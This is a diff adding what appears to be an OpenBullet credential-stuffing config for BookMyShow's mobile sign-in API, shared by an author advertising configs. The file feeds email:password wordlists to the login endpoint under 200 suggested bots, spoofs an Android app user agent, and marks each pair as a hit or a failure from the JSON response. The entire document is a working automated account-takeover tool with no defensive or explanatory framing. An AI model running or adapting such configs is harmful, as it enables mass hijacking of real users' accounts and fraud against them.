@@ -1,0 +1,36 @@
+[SETTINGS]
+{
+  "Name": "BookMyShow",
+  "SuggestedBots": 200,
+  "LastModified": "2018-10-11T18:49:28.0783744+00:00",
+  "AdditionalInfo": "Proxyless Api ",
+  "Author": "Kermit#1443 Contact for Configs",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://services.in.bookmyshow.com/doTrans.aspx" AutoRedirect=TRUE 
+  CONTENT "strAppCode=MOBAND2&strVenueCode=&lngTransactionIdentifier=0&strCommand=SIGNIN&strParam1=<USER>&strParam2=<PASS>&strFormat=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; oppo a53 Build/LYZ28N)" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "blnSuccess\":\"true\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "blnSuccess\":\"false" 
